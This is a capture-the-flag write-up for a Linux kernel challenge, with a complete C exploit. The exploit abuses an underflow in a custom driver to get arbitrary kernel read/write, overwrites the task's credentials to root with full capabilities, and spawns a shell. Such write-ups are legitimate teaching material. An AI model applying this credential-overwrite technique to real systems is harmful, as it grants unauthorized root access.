# CORN

author: alng

category: pwn

## Solution

Steps:
1. There is underflow r/w vuln due to being able to set an invalid r/w offset
   * invalid bounds checking when accessing struct corn_kernel->offset
2. Use this to leak current task_struct from corn_kernel->owner
3. With underflow bug abv., we can modify corn_kernel->data_ptr
4. This gives us arb r/w, use this to patch our task_struct's credentials
5. You are now root, yay

Exploit code (solve.c):
```c
#include "racelib.h" // just contains all the includes
#define DELTA_CREDS 0x720

struct cred_uid {
	uint32_t uid;             /* real UID of the task */
    uint32_t gid;             /* real GID of the task */
    uint32_t suid;            /* saved UID of the task */
    uint32_t sgid;            /* saved GID of the task */
    uint32_t euid;            /* effective UID of the task */
    uint32_t egid;            /* effective GID of the task */
    uint32_t fsuid;           /* UID for VFS ops */
    uint32_t fsgid;           /* GID for VFS ops */
    uint32_t securebits;      /* SUID-less security management */
    uint64_t cap_inheritable; /* caps our children can inherit */
    uint64_t cap_permitted;   /* caps we're permitted */
    uint64_t cap_effective;   /* caps we can actually use */
    uint64_t cap_bset;        /* capability bounding set */
};

#define GLOBAL_ROOT_UID     0
#define GLOBAL_ROOT_GID     0
#define SECURE_BITS_DEFAULT 0
#define CAP_EMPTY_SET       0
#define CAP_FULL_SET        -1

void main() {

	int res = 0;
	void *buf[0x100];

	int fd = open("/dev/corndev", O_RDWR);
    LOG("open res: %d", fd);

	ioctl(fd, 0, 0);
	ioctl(fd, 3, 0);
	ioctl(fd, 4, (long) -0x10);
	pread(fd, buf, 0x20, 0);
	uint64_t task_struct = buf[0];
	uint64_t task_creds = task_struct + DELTA_CREDS;
	printf("task_struct %p\n", task_struct);
	ioctl(fd, 4, (long) 0x8);
	pwrite(fd, &task_creds, 0x8, 0);
	ioctl(fd, 4, 0x8);
	pread(fd, buf, 0x20, 0);
	uint64_t task_creds_uid = buf[0] + 8;
	printf("creds_uid: %p\n", task_creds_uid);

	ioctl(fd, 0, 1);
	ioctl(fd, 3, 0);
	ioctl(fd, 4, (long) -0x8);
	pwrite(fd, &task_creds_uid, 0x8, 0);
	ioctl(fd, 4, 0x8);

	struct cred_uid new_cred;
	new_cred.uid = GLOBAL_ROOT_UID;
	new_cred.gid = GLOBAL_ROOT_GID;
	new_cred.suid = GLOBAL_ROOT_UID;
	new_cred.sgid = GLOBAL_ROOT_GID;
	new_cred.euid = GLOBAL_ROOT_UID;
	new_cred.egid = GLOBAL_ROOT_GID;
	new_cred.fsuid = GLOBAL_ROOT_UID;
	new_cred.fsgid = GLOBAL_ROOT_GID;
	new_cred.securebits = SECURE_BITS_DEFAULT;
	new_cred.cap_inheritable = CAP_EMPTY_SET;
	new_cred.cap_permitted = CAP_FULL_SET;
	new_cred.cap_effective = CAP_FULL_SET;
	new_cred.cap_bset = CAP_FULL_SET;

	pwrite(fd, &new_cred, sizeof(struct cred_uid), 0);

	setgid(0);
	setuid(0);
	system("/bin/sh");
	return;

}
```